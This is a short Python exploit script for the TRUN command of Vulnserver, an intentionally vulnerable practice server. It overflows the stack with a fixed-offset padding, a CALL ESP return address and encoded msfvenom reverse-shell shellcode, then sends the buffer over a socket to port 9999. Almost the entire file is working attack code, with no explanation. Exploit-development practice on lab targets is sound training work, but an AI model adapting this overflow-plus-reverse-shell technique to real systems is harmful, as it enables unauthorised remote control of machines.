#########################################################################################
# Title: Vulnserver TRUN command exploit
# Author: Marco Lugo
# Description: execute payload
#
#              To get Stephen Bradshaw's Vulnserver, visit:
#              http://www.thegreycorner.com/2010/12/introducing-vulnserver.html
#########################################################################################

import socket
import sys
import os
import struct

target_ip = sys.argv[1]
call_esp = struct.pack('<I', 0x7C82385D)
# msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -e x86/shikata_ga_nai -b '\x00' -n 20 -f python
buf =  ""
buf += "\xfd\x4a\x37\x4b\x98\x42\x93\x93\x27\x27\x92\x98\x90"
buf += "\xfc\x93\x91\xfc\x91\x4a\x49\xba\xc5\x09\xf6\x5f\xdb"
buf += "\xd3\xd9\x74\x24\xf4\x5d\x2b\xc9\xb1\x52\x31\x55\x12"
buf += "\x03\x55\x12\x83\x28\xf5\x14\xaa\x4e\xee\x5b\x55\xae"
buf += "\xef\x3b\xdf\x4b\xde\x7b\xbb\x18\x71\x4c\xcf\x4c\x7e"
buf += "\x27\x9d\x64\xf5\x45\x0a\x8b\xbe\xe0\x6c\xa2\x3f\x58"
buf += "\x4c\xa5\xc3\xa3\x81\x05\xfd\x6b\xd4\x44\x3a\x91\x15"
buf += "\x14\x93\xdd\x88\x88\x90\xa8\x10\x23\xea\x3d\x11\xd0"
buf += "\xbb\x3c\x30\x47\xb7\x66\x92\x66\x14\x13\x9b\x70\x79"
buf += "\x1e\x55\x0b\x49\xd4\x64\xdd\x83\x15\xca\x20\x2c\xe4"
buf += "\x12\x65\x8b\x17\x61\x9f\xef\xaa\x72\x64\x8d\x70\xf6"
buf += "\x7e\x35\xf2\xa0\x5a\xc7\xd7\x37\x29\xcb\x9c\x3c\x75"
buf += "\xc8\x23\x90\x0e\xf4\xa8\x17\xc0\x7c\xea\x33\xc4\x25"
buf += "\xa8\x5a\x5d\x80\x1f\x62\xbd\x6b\xff\xc6\xb6\x86\x14"
buf += "\x7b\x95\xce\xd9\xb6\x25\x0f\x76\xc0\x56\x3d\xd9\x7a"
buf += "\xf0\x0d\x92\xa4\x07\x71\x89\x11\x97\x8c\x32\x62\xbe"
buf += "\x4a\x66\x32\xa8\x7b\x07\xd9\x28\x83\xd2\x4e\x78\x2b"
buf += "\x8d\x2e\x28\x8b\x7d\xc7\x22\x04\xa1\xf7\x4d\xce\xca"
buf += "\x92\xb4\x99\x8b\x62\xb6\x58\x1c\x61\xb6\x4b\x80\xec"
buf += "\x50\x01\x28\xb9\xcb\xbe\xd1\xe0\x87\x5f\x1d\x3f\xe2"
buf += "\x60\x95\xcc\x13\x2e\x5e\xb8\x07\xc7\xae\xf7\x75\x4e"
buf += "\xb0\x2d\x11\x0c\x23\xaa\xe1\x5b\x58\x65\xb6\x0c\xae"
buf += "\x7c\x52\xa1\x89\xd6\x40\x38\x4f\x10\xc0\xe7\xac\x9f"
buf += "\xc9\x6a\x88\xbb\xd9\xb2\x11\x80\x8d\x6a\x44\x5e\x7b"
buf += "\xcd\x3e\x10\xd5\x87\xed\xfa\xb1\x5e\xde\x3c\xc7\x5e"
buf += "\x0b\xcb\x27\xee\xe2\x8a\x58\xdf\x62\x1b\x21\x3d\x13"
buf += "\xe4\xf8\x85\x23\xaf\xa0\xac\xab\x76\x31\xed\xb1\x88"
buf += "\xec\x32\xcc\x0a\x04\xcb\x2b\x12\x6d\xce\x70\x94\x9e"
buf += "\xa2\xe9\x71\xa0\x11\x09\x50"

buffer = 'TRUN /.:/'
pattern = '\x41'*2003 + call_esp + buf + '\x90'*(3193 - len(buf))
buffer += pattern

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((target_ip, 9999))
sock.recv(1024)
sock.send(buffer)
sock.close()
